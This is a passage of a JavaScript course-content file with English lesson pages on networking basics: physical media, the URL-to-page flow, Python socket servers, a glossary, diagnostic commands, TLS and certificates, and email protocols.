          <p><strong>Fiber optic types:</strong></p>
          <ul>
            <li><strong>Single-mode (SMF)</strong> — one light path, very long distance</li>
            <li><strong>Multi-mode (MMF)</strong> — multiple light paths, shorter distance, cheaper</li>
          </ul>
        `
      },
      {
        // Page 4: WiFi 802.11
        titleEn: "WiFi — 802.11 Standards",
        contentEn: `
          <p><strong>WiFi</strong> uses radio waves to transmit data wirelessly.</p>
          <p>The standard is called <strong>IEEE 802.11</strong>.</p>
          <table>
            <thead>
              <tr><th>Standard</th><th>Name</th><th>Frequency</th><th>Max Speed</th></tr>
            </thead>
            <tbody>
              <tr><td>802.11n</td><td>WiFi 4</td><td>2.4 / 5 GHz</td><td>600 Mbps</td></tr>
              <tr><td>802.11ac</td><td>WiFi 5</td><td>5 GHz</td><td>3.5 Gbps</td></tr>
              <tr><td>802.11ax</td><td>WiFi 6</td><td>2.4 / 5 / 6 GHz</td><td>9.6 Gbps</td></tr>
            </tbody>
          </table>
          <p><strong>Key concepts:</strong></p>
          <ul>
            <li><strong>2.4 GHz</strong> — longer range, slower, more interference</li>
            <li><strong>5 GHz</strong> — shorter range, faster, less interference</li>
            <li><strong>SSID</strong> — the name of the WiFi network</li>
            <li><strong>WPA3</strong> — the latest WiFi security standard</li>
          </ul>
        `
      },
      {
        // Page 5: Encoding NRZ / Manchester
        titleEn: "Signal Encoding — NRZ and Manchester",
        contentEn: `
          <p>How do we represent 0s and 1s as electrical signals?</p>
          <p><strong>NRZ (Non-Return to Zero):</strong></p>
          <ul>
            <li>High voltage = 1, Low voltage = 0</li>
            <li>Simple, but has a problem: long runs of 1s or 0s lose synchronization</li>
          </ul>
          <p><strong>Manchester Encoding:</strong></p>
          <ul>
            <li>Each bit has a <strong>transition</strong> in the middle of the clock period</li>
            <li>Low→High = 1, High→Low = 0</li>
            <li>The transition acts as a built-in clock signal</li>
            <li>Used in 10BASE-T Ethernet</li>
          </ul>
          <p><strong>Why does this matter?</strong> The receiver needs to know when each bit starts and ends. Manchester encoding solves this by always changing the signal.</p>
        `
      },
      {
        // Page 6: Full/Half Duplex + CSMA/CD
        titleEn: "Duplex Modes and CSMA/CD",
        contentEn: `
          <p><strong>Half Duplex</strong> — only one side can send at a time.</p>
          <ul>
            <li>Like a walkie-talkie — you talk OR you listen</li>
            <li>Used with hubs</li>
          </ul>
          <p><strong>Full Duplex</strong> — both sides can send and receive at the same time.</p>
          <ul>
            <li>Like a phone call — both people can talk</li>
            <li>Used with switches — each port is full duplex</li>
          </ul>
          <p><strong>CSMA/CD</strong> (Carrier Sense Multiple Access / Collision Detection):</p>
          <ul>
            <li>Used in half-duplex Ethernet</li>
            <li><strong>Listen</strong> before sending — is the wire busy?</li>
            <li>If two devices send at the same time → <strong>collision</strong></li>
            <li>Both stop, wait a <strong>random time</strong>, then try again</li>
          </ul>
          <p>With full-duplex switches, CSMA/CD is not needed anymore.</p>
        `
      },
      {
        // Page 7: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 8: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li>The Physical Layer moves <strong>raw bits</strong> using electrical, light, or radio signals</li>
            <li><strong>Bandwidth</strong> = how much data per second; <strong>Latency</strong> = how long the delay</li>
            <li><strong>Copper, Fiber, WiFi</strong> — three main transmission technologies</li>
            <li><strong>Cat5e/Cat6</strong> cables with <strong>RJ-45</strong> connectors are most common</li>
            <li><strong>WiFi 802.11</strong> — versions n/ac/ax, frequencies 2.4 and 5 GHz</li>
            <li><strong>Manchester encoding</strong> solves clock synchronization</li>
            <li><strong>Full duplex</strong> (switches) replaced <strong>half duplex + CSMA/CD</strong> (hubs)</li>
          </ul>
        `
      },
      {
        // Page 9: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 11 ==========
  11: {
    titleEn: "How It All Connects",
    pages: [
      {
        // Page 0: Full browsing story
        titleEn: "The Full Journey — From URL to Web Page",
        contentEn: `
          <p>What happens when you type <code>https://www.example.com</code> and press Enter?</p>
          <p><strong>8 steps happen behind the scenes:</strong></p>
          <ol>
            <li><strong>DHCP</strong> — Your computer already got an IP address from the router when it connected</li>
            <li><strong>DNS query</strong> — Browser asks "What is the IP of www.example.com?" → gets <code>93.184.216.34</code></li>
            <li><strong>ARP</strong> — Computer needs the router's MAC address to send the packet out</li>
            <li><strong>TCP handshake</strong> — Three-way handshake (SYN → SYN-ACK → ACK) opens a connection</li>
            <li><strong>TLS handshake</strong> — Client and server agree on encryption keys (because HTTPS)</li>
            <li><strong>HTTP GET</strong> — Browser sends <code>GET /index.html</code> inside the encrypted tunnel</li>
            <li><strong>Server responds</strong> — Server sends back the HTML page</li>
            <li><strong>Browser renders</strong> — The HTML is parsed and displayed on screen</li>
          </ol>
          <p>All of this happens in <strong>less than one second</strong>.</p>
        `
      },
      {
        // Page 1: Wireshark view
        titleEn: "Seeing the Flow in Wireshark",
        contentEn: `
          <p>If we capture the traffic with <strong>Wireshark</strong>, we see the packets in order:</p>
          <table>
            <thead>
              <tr><th>#</th><th>Protocol</th><th>Description</th></tr>
            </thead>
            <tbody>
              <tr><td>1</td><td>DNS</td><td>Query: "What is the IP of www.example.com?"</td></tr>
              <tr><td>2</td><td>DNS</td><td>Response: 93.184.216.34</td></tr>
              <tr><td>3</td><td>TCP</td><td>SYN → (start of three-way handshake)</td></tr>
              <tr><td>4</td><td>TCP</td><td>SYN-ACK ←</td></tr>
              <tr><td>5</td><td>TCP</td><td>ACK →</td></tr>
              <tr><td>6-9</td><td>TLS</td><td>ClientHello, ServerHello, certificates, keys</td></tr>
              <tr><td>10</td><td>HTTP</td><td>GET /index.html (encrypted inside TLS)</td></tr>
              <tr><td>11</td><td>HTTP</td><td>200 OK + HTML content</td></tr>
            </tbody>
          </table>
          <p>Each line is a real packet that traveled through the network.</p>
        `
      },
      {
        // Page 2: Encapsulation order
        titleEn: "Encapsulation — Each Layer Adds a Header",
        contentEn: `
          <p>Data moves <strong>from top to bottom</strong> through the layers. Each layer <strong>wraps</strong> the data with its own header.</p>
          <ul>
            <li><strong>Application Layer</strong> — creates the HTTP request (e.g., GET /index.html)</li>
            <li><strong>Transport Layer</strong> — adds TCP header (source port, destination port, sequence number)</li>
            <li><strong>Network Layer</strong> — adds IP header (source IP, destination IP)</li>
            <li><strong>Data Link Layer</strong> — adds Ethernet header (source MAC, destination MAC) + trailer</li>
            <li><strong>Physical Layer</strong> — converts everything to bits on the wire</li>
          </ul>
          <p><strong>The result:</strong></p>
          <p><code>[Ethernet Header | IP Header | TCP Header | HTTP Data | Ethernet Trailer]</code></p>
          <p>On the other side, the layers <strong>unwrap</strong> the headers from bottom to top.</p>
        `
      },
      {
        // Page 3: CDN
        titleEn: "CDN — Content Delivery Network",
        contentEn: `
          <p>What happens when the server is behind a <strong>CDN</strong>?</p>
          <p>A CDN is a network of servers around the world that <strong>cache copies</strong> of website content.</p>
          <ul>
            <li>You type <code>www.example.com</code> in your browser</li>
            <li>DNS resolves to the <strong>nearest CDN server</strong>, not the original server</li>
            <li>If the CDN has a cached copy → it responds directly (<strong>cache hit</strong>)</li>
            <li>If not → the CDN fetches from the origin server, caches it, then responds (<strong>cache miss</strong>)</li>
          </ul>
          <p><strong>Benefits of CDN:</strong></p>
          <ul>
            <li><strong>Lower latency</strong> — the server is closer to the user</li>
            <li><strong>Less load</strong> — the origin server handles fewer requests</li>
            <li><strong>DDoS protection</strong> — CDN absorbs attack traffic</li>
          </ul>
          <p>Popular CDNs: <strong>Cloudflare</strong>, <strong>Akamai</strong>, <strong>AWS CloudFront</strong>.</p>
        `
      },
      {
        // Page 4: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 5: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li>Browsing a website involves <strong>8 steps</strong>: DHCP, DNS, ARP, TCP, TLS, HTTP, response, render</li>
            <li>Wireshark lets you see every packet in the flow</li>
            <li><strong>Encapsulation</strong> — each layer adds its own header around the data</li>
            <li><strong>CDN</strong> caches content on servers close to users for faster loading</li>
            <li>All layers work together to deliver a web page in under one second</li>
          </ul>
        `
      },
      {
        // Page 6: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 12 ==========
  12: {
    titleEn: "Advanced Socket Programming",
    pages: [
      {
        // Page 0: Multiple clients problem
        titleEn: "The Problem — Handling Multiple Clients",
        contentEn: `
          <p>In basic socket programming, the server handles <strong>one client at a time</strong>.</p>
          <p>While talking to Client A, Client B has to <strong>wait</strong>.</p>
          <p><strong>Why is this a problem?</strong></p>
          <ul>
            <li>A web server needs to handle hundreds of users at once</li>
            <li>A chat server must receive and send messages to many users</li>
            <li>Blocking on one client = all others are stuck</li>
          </ul>
          <p><strong>Three solutions:</strong></p>
          <ol>
            <li><strong>select()</strong> — check multiple sockets at once</li>
            <li><strong>Threading</strong> — create a new thread for each client</li>
            <li><strong>asyncio</strong> — modern async/await approach</li>
          </ol>
        `
      },
      {
        // Page 1: select()
        titleEn: "select() — Monitoring Multiple Sockets",
        contentEn: `
          <p><code>select()</code> lets you watch multiple sockets and know which ones are <strong>ready to read</strong>.</p>
          <ul>
            <li>You give it a list of sockets</li>
            <li>It blocks until at least one socket has data</li>
            <li>Then you handle only the ready sockets</li>
          </ul>
          <p><strong>How it works:</strong></p>
          <ol>
            <li>Create a list of sockets to monitor</li>
            <li>Call <code>select.select(read_list, write_list, error_list)</code></li>
            <li>It returns which sockets are ready</li>
            <li>If the server socket is ready → accept a new client</li>
            <li>If a client socket is ready → read the message</li>
          </ol>
          <p><strong>Advantage:</strong> one thread handles many clients. <strong>Disadvantage:</strong> the code can be complex.</p>
        `
      },
      {
        // Page 2: select() demo code
        titleEn: "Demo — select() Server",
        contentEn: `
          <p>A simple chat server using <code>select()</code>:</p>
<pre><code>import socket, select

server = socket.socket()
server.bind(("0.0.0.0", 9000))
server.listen(5)

sockets_list = [server]
clients = {}

while True:
    ready, _, _ = select.select(sockets_list, [], [])
    for s in ready:
        if s is server:
            client, addr = server.accept()
            sockets_list.append(client)
            clients[client] = addr
            print(f"New client: {addr}")
        else:
            data = s.recv(1024)
            if not data:
                sockets_list.remove(s)
                del clients[s]
                s.close()
            else:
                print(f"{clients[s]}: {data.decode()}")
</code></pre>
          <p>This server handles many clients in a <strong>single thread</strong>.</p>
        `
      },
      {
        // Page 3: Threading demo code
        titleEn: "Demo — Threading Server",
        contentEn: `
          <p>Another approach: create a <strong>new thread</strong> for each client.</p>
<pre><code>import socket
import threading

def handle_client(client, addr):
    while True:
        data = client.recv(1024)
        if not data:
            break
        print(f"{addr}: {data.decode()}")
    client.close()

server = socket.socket()
server.bind(("0.0.0.0", 9000))
server.listen(5)

while True:
    client, addr = server.accept()
    t = threading.Thread(target=handle_client,
                         args=(client, addr))
    t.start()
</code></pre>
          <p><strong>Advantage:</strong> simple code, each client runs independently.</p>
          <p><strong>Disadvantage:</strong> many threads use a lot of memory. Not good for thousands of clients.</p>
        `
      },
      {
        // Page 4: Python 3 encoding/bytes
        titleEn: "Python 3 — Strings vs Bytes",
        contentEn: `
          <p>In Python 3, <strong>strings</strong> and <strong>bytes</strong> are different types.</p>
          <ul>
            <li><code>"hello"</code> — a string (text, Unicode)</li>
            <li><code>b"hello"</code> — bytes (raw data)</li>
          </ul>
          <p><strong>Sockets send and receive bytes, not strings.</strong></p>
          <p>You must convert between them:</p>
<pre><code># String → Bytes (encoding)
text = "Hello!"
data = text.encode("utf-8")  # b"Hello!"

# Bytes → String (decoding)
data = b"Hello!"
text = data.decode("utf-8")  # "Hello!"
</code></pre>
          <p><strong>Common mistake:</strong> sending a string without <code>.encode()</code> → <code>TypeError</code>.</p>
          <p><strong>Tip:</strong> Always use <code>utf-8</code> encoding. It supports all languages.</p>
        `
      },
      {
        // Page 5: Length prefix protocol
        titleEn: "Length Prefix Protocol",
        contentEn: `
          <p>TCP is a <strong>stream</strong> — it does not have message boundaries.</p>
          <p>If you send "Hello" then "World", the receiver might get "HelloWorld" in one read.</p>
          <p><strong>Solution: Length prefix</strong></p>
          <ul>
            <li>Before each message, send its <strong>length as a fixed-size header</strong></li>
            <li>The receiver first reads the length, then reads exactly that many bytes</li>
          </ul>
<pre><code># Sender
msg = "Hello!".encode()
length = len(msg).to_bytes(4, "big")  # 4-byte header
sock.send(length + msg)

# Receiver
raw_len = sock.recv(4)
msg_len = int.from_bytes(raw_len, "big")
data = sock.recv(msg_len)
print(data.decode())  # "Hello!"
</code></pre>
          <p>This pattern is used in many real protocols.</p>
        `
      },
      {
        // Page 6: asyncio
        titleEn: "asyncio — Modern Async Programming",
        contentEn: `
          <p><strong>asyncio</strong> is Python's built-in library for asynchronous programming.</p>
          <ul>
            <li>Uses <code>async</code> and <code>await</code> keywords</li>
            <li>One thread, but switches between tasks while waiting for I/O</li>
            <li>Can handle thousands of connections efficiently</li>
          </ul>
<pre><code>import asyncio

async def handle_client(reader, writer):
    data = await reader.read(1024)
    message = data.decode()
    print(f"Received: {message}")
    writer.write(b"Got it!")
    await writer.drain()
    writer.close()

async def main():
    server = await asyncio.start_server(
        handle_client, "0.0.0.0", 9000)
    async with server:
        await server.serve_forever()

asyncio.run(main())
</code></pre>
          <p><strong>asyncio</strong> is the recommended approach for modern Python servers.</p>
        `
      },
      {
        // Page 7: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li>A basic server can only handle <strong>one client at a time</strong> — not useful in practice</li>
            <li><strong>select()</strong> — monitors multiple sockets in one thread</li>
            <li><strong>Threading</strong> — one thread per client, simple but uses more memory</li>
            <li><strong>asyncio</strong> — modern async/await, handles thousands of clients efficiently</li>
            <li>Python 3: sockets use <strong>bytes</strong>, not strings — use <code>.encode()</code> and <code>.decode()</code></li>
            <li><strong>Length prefix</strong> solves TCP's stream problem — send the message length before the message</li>
          </ul>
        `
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 13 ==========
  13: {
    titleEn: "Glossary of Terms",
    pages: [
      {
        // Page 0: A-F
        titleEn: "Glossary: A – F",
        contentEn: `
          <table>
            <thead><tr><th>Term</th><th>Definition</th></tr></thead>
            <tbody>
              <tr><td><strong>ACK</strong></td><td>Acknowledgment — a message confirming data was received</td></tr>
              <tr><td><strong>ARP</strong></td><td>Address Resolution Protocol — finds the MAC address for a given IP</td></tr>
              <tr><td><strong>Bandwidth</strong></td><td>Maximum amount of data that can travel per second (bps)</td></tr>
              <tr><td><strong>Broadcast</strong></td><td>Sending a message to all devices on the network</td></tr>
              <tr><td><strong>CDN</strong></td><td>Content Delivery Network — servers around the world that cache content</td></tr>
              <tr><td><strong>CIDR</strong></td><td>Classless Inter-Domain Routing — flexible way to define network size (e.g., /24)</td></tr>
              <tr><td><strong>Client</strong></td><td>A device or program that requests a service from a server</td></tr>
              <tr><td><strong>CSMA/CD</strong></td><td>Collision detection method used in half-duplex Ethernet</td></tr>
              <tr><td><strong>DHCP</strong></td><td>Dynamic Host Configuration Protocol — automatically gives IP addresses to devices</td></tr>
              <tr><td><strong>DNS</strong></td><td>Domain Name System — translates domain names to IP addresses</td></tr>
              <tr><td><strong>Encapsulation</strong></td><td>Each layer wraps data with its own header before sending</td></tr>
              <tr><td><strong>Ethernet</strong></td><td>The most common wired LAN technology (IEEE 802.3)</td></tr>
              <tr><td><strong>Firewall</strong></td><td>Filters network traffic based on allow/block rules</td></tr>
              <tr><td><strong>FTP</strong></td><td>File Transfer Protocol — sends files between computers (port 21)</td></tr>
              <tr><td><strong>Full Duplex</strong></td><td>Both sides can send and receive at the same time</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 1: G-M
        titleEn: "Glossary: G – M",
        contentEn: `
          <table>
            <thead><tr><th>Term</th><th>Definition</th></tr></thead>
            <tbody>
              <tr><td><strong>Gateway</strong></td><td>A device that connects two different networks (usually the router)</td></tr>
              <tr><td><strong>HTTP</strong></td><td>HyperText Transfer Protocol — the protocol for web pages (port 80)</td></tr>
              <tr><td><strong>HTTPS</strong></td><td>HTTP over TLS — encrypted web traffic (port 443)</td></tr>
              <tr><td><strong>Hub</strong></td><td>Layer 1 device that sends data to all ports</td></tr>
              <tr><td><strong>ICMP</strong></td><td>Internet Control Message Protocol — used by ping and traceroute</td></tr>
              <tr><td><strong>IP Address</strong></td><td>A unique number that identifies a device on a network (e.g., 192.168.1.1)</td></tr>
              <tr><td><strong>IPv4</strong></td><td>IP version 4 — 32-bit addresses (4.3 billion possible)</td></tr>
              <tr><td><strong>IPv6</strong></td><td>IP version 6 — 128-bit addresses (practically unlimited)</td></tr>
              <tr><td><strong>ISP</strong></td><td>Internet Service Provider — the company that gives you Internet access</td></tr>
              <tr><td><strong>LAN</strong></td><td>Local Area Network — a small network (home, office)</td></tr>
              <tr><td><strong>Latency</strong></td><td>The time delay for data to travel from source to destination</td></tr>
              <tr><td><strong>MAC Address</strong></td><td>Media Access Control — a unique hardware address for each network card</td></tr>
              <tr><td><strong>MTU</strong></td><td>Maximum Transmission Unit — largest packet size allowed (usually 1500 bytes)</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 2: N-T
        titleEn: "Glossary: N – T",
        contentEn: `
          <table>
            <thead><tr><th>Term</th><th>Definition</th></tr></thead>
            <tbody>
              <tr><td><strong>NAT</strong></td><td>Network Address Translation — maps private IPs to one public IP</td></tr>
              <tr><td><strong>OSI Model</strong></td><td>7-layer reference model for networking (Physical → Application)</td></tr>
              <tr><td><strong>Packet</strong></td><td>A small piece of data sent over a network</td></tr>
              <tr><td><strong>Ping</strong></td><td>A tool that sends ICMP echo requests to test connectivity</td></tr>
              <tr><td><strong>Port</strong></td><td>A number (0–65535) that identifies a specific service on a device</td></tr>
              <tr><td><strong>Protocol</strong></td><td>A set of rules for how devices communicate</td></tr>
              <tr><td><strong>Router</strong></td><td>Layer 3 device that forwards packets between networks using IP addresses</td></tr>
              <tr><td><strong>Server</strong></td><td>A device or program that provides services to clients</td></tr>
              <tr><td><strong>SMTP</strong></td><td>Simple Mail Transfer Protocol — sends email (port 25/587)</td></tr>
              <tr><td><strong>SSH</strong></td><td>Secure Shell — encrypted remote access (port 22)</td></tr>
              <tr><td><strong>Subnet Mask</strong></td><td>Defines which part of an IP is the network and which is the host</td></tr>
              <tr><td><strong>Switch</strong></td><td>Layer 2 device that forwards frames based on MAC addresses</td></tr>
              <tr><td><strong>TCP</strong></td><td>Transmission Control Protocol — reliable, ordered delivery (connection-based)</td></tr>
              <tr><td><strong>TLS</strong></td><td>Transport Layer Security — encrypts data in transit (used by HTTPS)</td></tr>
              <tr><td><strong>TTL</strong></td><td>Time to Live — limits how many hops a packet can take</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 3: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 14 ==========
  14: {
    titleEn: "Commands and Tools",
    pages: [
      {
        // Page 0: Common commands
        titleEn: "Essential Network Commands",
        contentEn: `
          <p>These commands help you check and troubleshoot networks:</p>
          <table>
            <thead><tr><th>Command</th><th>What it does</th><th>Example</th></tr></thead>
            <tbody>
              <tr><td><code>ping</code></td><td>Tests if a host is reachable</td><td><code>ping google.com</code></td></tr>
              <tr><td><code>tracert</code> / <code>traceroute</code></td><td>Shows the path packets take to a destination</td><td><code>tracert google.com</code></td></tr>
              <tr><td><code>netstat</code></td><td>Shows active connections and open ports</td><td><code>netstat -an</code></td></tr>
              <tr><td><code>ipconfig</code> / <code>ifconfig</code></td><td>Shows your IP address and network settings</td><td><code>ipconfig /all</code></td></tr>
              <tr><td><code>nslookup</code></td><td>Queries DNS — finds the IP of a domain</td><td><code>nslookup google.com</code></td></tr>
              <tr><td><code>arp -a</code></td><td>Shows the ARP table (IP → MAC mappings)</td><td><code>arp -a</code></td></tr>
            </tbody>
          </table>
          <p><strong>Tip:</strong> Windows uses <code>ipconfig</code> and <code>tracert</code>. Linux/Mac uses <code>ifconfig</code> and <code>traceroute</code>.</p>
        `
      },
      {
        // Page 1: Demo output examples
        titleEn: "Demo — Command Output Examples",
        contentEn: `
          <p><strong>ping google.com:</strong></p>
<pre><code>Pinging google.com [142.250.74.46] with 32 bytes of data:
Reply from 142.250.74.46: bytes=32 time=12ms TTL=118
Reply from 142.250.74.46: bytes=32 time=11ms TTL=118
</code></pre>
          <p>→ The server is reachable, latency is ~12 ms.</p>

          <p><strong>nslookup google.com:</strong></p>
<pre><code>Server:   192.168.1.1
Address:  192.168.1.1#53

Name:     google.com
Address:  142.250.74.46
</code></pre>
          <p>→ DNS resolved google.com to 142.250.74.46.</p>

          <p><strong>netstat -an (partial):</strong></p>
<pre><code>Proto  Local Address     Foreign Address    State
TCP    192.168.1.5:54321  142.250.74.46:443  ESTABLISHED
TCP    192.168.1.5:54322  52.6.120.34:80     TIME_WAIT
</code></pre>
          <p>→ Shows active connections to remote servers.</p>
        `
      },
      {
        // Page 2: Tools
        titleEn: "Network Tools — Wireshark, Scapy, Telnet",
        contentEn: `
          <p><strong>Wireshark</strong></p>
          <ul>
            <li>A GUI tool that <strong>captures and analyzes</strong> network packets</li>
            <li>Shows every packet in detail — headers, payload, timing</li>
            <li>Filters: <code>http</code>, <code>tcp.port == 443</code>, <code>ip.addr == 192.168.1.5</code></li>
            <li>Essential for debugging network problems</li>
          </ul>
          <p><strong>Scapy</strong></p>
          <ul>
            <li>A Python library for <strong>creating and sending</strong> custom packets</li>
            <li>Can build packets from scratch — any protocol, any field</li>
            <li>Used for testing, security research, and learning</li>
          </ul>
          <p><strong>Telnet</strong></p>
          <ul>
            <li>A simple tool to connect to a port and send text</li>
            <li>Example: <code>telnet google.com 80</code> then type <code>GET / HTTP/1.1</code></li>
            <li><strong>Not encrypted</strong> — do not use for real logins</li>
          </ul>
        `
      },
      {
        // Page 3: More commands
        titleEn: "More Useful Commands",
        contentEn: `
          <table>
            <thead><tr><th>Command</th><th>What it does</th><th>Example</th></tr></thead>
            <tbody>
              <tr><td><code>route print</code> / <code>ip route</code></td><td>Shows the routing table</td><td><code>route print</code> (Windows)</td></tr>
              <tr><td><code>hostname</code></td><td>Shows the computer's name</td><td><code>hostname</code></td></tr>
              <tr><td><code>curl</code></td><td>Sends HTTP requests from the command line</td><td><code>curl https://api.example.com</code></td></tr>
              <tr><td><code>dig</code></td><td>Advanced DNS query tool (Linux)</td><td><code>dig google.com MX</code></td></tr>
              <tr><td><code>ss</code></td><td>Modern replacement for netstat (Linux)</td><td><code>ss -tuln</code></td></tr>
            </tbody>
          </table>
          <p><strong>curl</strong> is especially useful for testing APIs:</p>
<pre><code>curl -v https://www.google.com
# Shows the full HTTP request and response headers
</code></pre>
        `
      },
      {
        // Page 4: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><code>ping</code> — tests if a host is reachable</li>
            <li><code>tracert</code> — shows the path to a destination</li>
            <li><code>netstat</code> / <code>ss</code> — shows active connections</li>
            <li><code>ipconfig</code> / <code>ifconfig</code> — shows network settings</li>
            <li><code>nslookup</code> / <code>dig</code> — queries DNS</li>
            <li><code>arp -a</code> — shows IP to MAC mappings</li>
            <li><strong>Wireshark</strong> — captures and analyzes packets (GUI)</li>
            <li><strong>Scapy</strong> — creates custom packets (Python)</li>
            <li><code>curl</code> — sends HTTP requests from the terminal</li>
          </ul>
        `
      },
      {
        // Page 5: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 15 ==========
  15: {
    titleEn: "HTTPS and TLS — Encrypted Communication",
    pages: [
      {
        // Page 0: Why encryption
        titleEn: "Why Do We Need Encryption?",
        contentEn: `
          <p>Without encryption, anyone on the network can <strong>read your data</strong>.</p>
          <ul>
            <li>On public WiFi, an attacker can capture all traffic</li>
            <li>Your passwords, messages, and credit card numbers are visible</li>
            <li>This is called a <strong>Man-in-the-Middle (MITM)</strong> attack</li>
          </ul>
          <p><strong>HTTP</strong> (port 80) sends everything in <strong>plain text</strong>.</p>
          <p><strong>HTTPS</strong> (port 443) encrypts everything using <strong>TLS</strong>.</p>
          <ul>
            <li>Even if someone captures your traffic, they see only random bytes</li>
            <li>Today, over <strong>95%</strong> of web traffic uses HTTPS</li>
            <li>Browsers show a 🔒 lock icon for HTTPS sites</li>
          </ul>
        `
      },
      {
        // Page 1: Symmetric vs Asymmetric
        titleEn: "Symmetric vs Asymmetric Encryption",
        contentEn: `
          <p><strong>Symmetric encryption</strong> — one key for both sides.</p>
          <ul>
            <li>Same key encrypts and decrypts</li>
            <li>Fast — used for the actual data</li>
            <li>Problem: how do you share the key safely?</li>
            <li>Examples: <strong>AES</strong>, <strong>ChaCha20</strong></li>
          </ul>
          <p><strong>Asymmetric encryption</strong> — two keys: public + private.</p>
          <ul>
            <li><strong>Public key</strong> — anyone can have it, used to encrypt</li>
            <li><strong>Private key</strong> — kept secret, used to decrypt</li>
            <li>Slow — used only to exchange the symmetric key</li>
            <li>Examples: <strong>RSA</strong>, <strong>ECDHE</strong></li>
          </ul>
          <p><strong>TLS uses both:</strong> asymmetric to exchange a key, then symmetric for the data.</p>
        `
      },
      {
        // Page 2: TLS Handshake
        titleEn: "TLS Handshake — Step by Step",
        contentEn: `
          <p>Before encrypted data can flow, client and server do a <strong>TLS handshake</strong>:</p>
          <ol>
            <li><strong>ClientHello</strong> — client sends: supported TLS versions, cipher suites, random number</li>
            <li><strong>ServerHello</strong> — server picks a TLS version and cipher suite, sends its random number</li>
            <li><strong>Certificate</strong> — server sends its certificate (contains the public key)</li>
            <li><strong>Key Exchange</strong> — both sides generate a shared secret using ECDHE</li>
            <li><strong>Finished</strong> — both sides confirm the handshake, switch to encrypted communication</li>
          </ol>
          <p><strong>After the handshake:</strong></p>
          <ul>
            <li>Both sides have the same <strong>session key</strong> (symmetric)</li>
            <li>All data is encrypted with this key</li>
            <li>The handshake takes 1-2 round trips (~50-100 ms)</li>
          </ul>
        `
      },
      {
        // Page 3: Certificates and CA
        titleEn: "Certificates and Chain of Trust",
        contentEn: `
          <p>How does your browser know the server is really google.com?</p>
          <p><strong>Certificates</strong> prove identity. A certificate contains:</p>
          <ul>
            <li>The domain name (e.g., google.com)</li>
            <li>The public key</li>
            <li>Who issued it (the CA)</li>
            <li>Expiration date</li>
          </ul>
          <p><strong>CA (Certificate Authority)</strong> — a trusted organization that signs certificates.</p>
          <p><strong>Chain of trust:</strong></p>
          <ol>
            <li><strong>Root CA</strong> — built into your browser/OS (e.g., DigiCert, Let's Encrypt)</li>
            <li><strong>Intermediate CA</strong> — signed by the Root CA</li>
            <li><strong>Server certificate</strong> — signed by the Intermediate CA</li>
          </ol>
          <p>The browser checks the chain: server cert → intermediate → root. If the root is trusted, the connection is safe.</p>
          <p><strong>Let's Encrypt</strong> provides free certificates — most websites use it today.</p>
        `
      },
      {
        // Page 4: Demo Python HTTPS
        titleEn: "Demo — Python HTTPS Request",
        contentEn: `
          <p>Making an HTTPS request in Python is simple with the <code>requests</code> library:</p>
<pre><code>import requests

# Simple HTTPS GET request
response = requests.get("https://api.github.com")
print(response.status_code)   # 200
print(response.json())        # JSON response

# Check the certificate
print(response.url)           # https://api.github.com/
</code></pre>
          <p><strong>What happens behind the scenes:</strong></p>
          <ul>
            <li>Python does the full TLS handshake automatically</li>
            <li>It verifies the server certificate against known CAs</li>
            <li>All data is encrypted — safe to send passwords and tokens</li>
          </ul>
<pre><code># You can also check certificate details:
import ssl, socket

ctx = ssl.create_default_context()
with ctx.wrap_socket(socket.socket(),
                     server_hostname="google.com") as s:
    s.connect(("google.com", 443))
    cert = s.getpeercert()
    print(cert["subject"])
</code></pre>
        `
      },
      {
        // Page 5: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 6: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>HTTP</strong> is plain text — anyone can read it. <strong>HTTPS</strong> encrypts everything</li>
            <li><strong>Symmetric</strong> encryption (AES) is fast — used for data</li>
            <li><strong>Asymmetric</strong> encryption (RSA/ECDHE) — used to exchange the symmetric key</li>
            <li>The <strong>TLS handshake</strong> establishes a secure connection in 5 steps</li>
            <li><strong>Certificates</strong> prove the server's identity — signed by a trusted CA</li>
            <li><strong>Chain of trust</strong>: server cert → intermediate CA → root CA</li>
            <li>Python's <code>requests</code> library handles TLS automatically</li>
          </ul>
        `
      },
      {
        // Page 7: simulation — SKIP
        titleEn: "Simulation",
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 16 ==========
  16: {
    titleEn: "Application Protocols — Email, FTP, SSH",
    pages: [
      {
        // Page 0: Email protocols
        titleEn: "Email — SMTP, IMAP, POP3",
        contentEn: `
          <p>Email uses three protocols:</p>
          <p><strong>SMTP</strong> (Simple Mail Transfer Protocol) — <strong>sends</strong> email.</p>
          <ul>
            <li>Port 25 (server-to-server) or 587 (client-to-server, with TLS)</li>
            <li>Your email client uses SMTP to send a message to your mail server</li>
            <li>Your mail server uses SMTP to deliver it to the recipient's server</li>
          </ul>
          <p><strong>IMAP</strong> (Internet Message Access Protocol) — <strong>reads</strong> email.</p>
          <ul>
            <li>Port 993 (with TLS)</li>
            <li>Email stays on the server — you can read it from multiple devices</li>
            <li>Supports folders, search, and flags</li>
          </ul>
          <p><strong>POP3</strong> (Post Office Protocol) — <strong>downloads</strong> email.</p>
          <ul>
            <li>Port 995 (with TLS)</li>
            <li>Downloads email to your device and <strong>deletes it from the server</strong></li>
            <li>Simple but only works on one device</li>
          </ul>
